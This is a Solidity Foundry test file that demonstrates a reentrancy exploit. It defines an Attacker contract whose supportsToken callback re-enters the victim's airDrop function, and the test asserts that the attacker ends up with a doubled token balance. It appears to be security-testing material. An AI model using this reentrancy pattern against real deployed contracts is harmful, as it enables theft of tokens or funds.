
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "forge-std/src/Test.sol";
import {ModifierEntrancy} from "../src/ModifierEntrancy.sol";

contract TestReentrancyModifierEntrancy is Test {
    ModifierEntrancy public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new ModifierEntrancy();

        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes() public {
        
        // --- 2. State Configuration (Pre-Condition) ---

        // --- 3. Funding ---
        // Not needed for this test

        // --- 4. Trigger Attack ---
        _attacker.setupAttack();
        _attacker.attack();

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ModifierEntrancy public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;

    bool hasBeenCalled;

    constructor(address victimAddress) { 
        _victim = ModifierEntrancy(victimAddress);
    }

    function setupAttack() public {
        attackCallCount = 0;
        exploitSucceeded = false;
        hasBeenCalled = false;
    }

    function attack() public {
        _victim.airDrop();

        if (_victim.tokenBalance(address(this)) == 40) {
            exploitSucceeded = true;
        }
    }

    function supportsToken() external returns(bytes32){
        attackCallCount++;
        if(!hasBeenCalled){
            hasBeenCalled = true;
            _victim.airDrop();
        }
        return(keccak256(abi.encodePacked("Nu Token")));
    }
}
